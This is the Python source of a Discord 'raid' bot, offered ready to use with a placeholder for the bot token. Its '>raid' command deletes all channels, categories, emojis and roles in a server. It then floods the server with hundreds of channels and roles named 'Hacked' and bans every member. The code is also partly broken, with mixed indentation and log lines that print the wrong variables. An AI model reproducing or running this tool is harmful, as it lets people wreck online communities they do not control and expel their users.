import discord.ext
from discord.ext import commands
from discord.ext.commands import bot
import asyncio
#imports that you need!

client=commands.Bot(command_prefix='>')#Prefix(you can change it to whatever you want!)

@client.event
async def on_ready():
	print('Bot is ready to Raid!')
	print('-----------------------')
	print('Raid Bot by EC2★Darky#9770')
	print('----------------------------')

client.remove_command("help")
#removes the help command!

@client.command(aliases=["Raid"])
async def raid(ctx):
	await ctx.message.delete()
	for channel in list(ctx.guild.channels):
		try:
			await channel.delete()
			print(f"Channel: {channel.name} has been deleted from {ctx.guild.name}")
		except:
			print(f"Channel: {channel.name} has failed to be deleted from {ctx.guild.name}")
	for voice_channel in list(ctx.guild.voice_channels):
		try:
			await voice_channel.delete()
			print(f"Voice: {channel.name} has been deleted from {ctx.guild.name}")
		except:
			print(f"Voice: {channel.name} has failed to be deleted from {ctx.guild.name}")
	for category in list(ctx.guild.categories):
		try:
			await category.delete()
			print(f"Category: {channel.name} has been deleted from {ctx.guild.name}")
		except:
			print(f"Category: {channel.name} has failed to be deleted from {ctx.guild.name}")
	for emoji in list(ctx.guild.emojis):
		try:
			await emoji.delete()
			print(f"Emoji: {emoji.name} has been deleted from {ctx.guild.name}")
		except:
			print(f"Emoji: {emoji.name} has failed to be deleted from {ctx.guild.name}")
	for role in list(ctx.guild.roles):
		try:
			await role.delete()
			print(f"Role: {role.name} has been deleted from {ctx.guild.name}")
		except:
			print(f"Role: {role.name} has failed to be deleted from {ctx.guild.name}")
	for i in range(0, 499):
		try:
			await ctx.guild.create_text_channel("Hacked")
			print(f"Channel: {channel.name} has been created in {ctx.guild.name}")
		except:
			print(f"Channel: {channel.name} was not able to be created in {ctx.guild.name}")
	for i in range(0, 499):
		try:
			await ctx.guild.create_role(name="Hacked")
			print(f"Role: {role.name} has been created in {ctx.guild.name}")
		except:
			print(f"Role: {role.name} was not able to be created in {ctx.guild.name}")
        for channel in list(ctx.guild.channels):
            await channel.send("Hacked")
	for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print(f"User: {user.name} has been banned from {ctx.guild.name}")
            except:
                print(f"User: {user.name} has failed to be banned from {ctx.guild.name}")
#The raid command!

client.run('BOT TOKEN')
#Delete the text BOT TOKEN and put your Bot token in there!
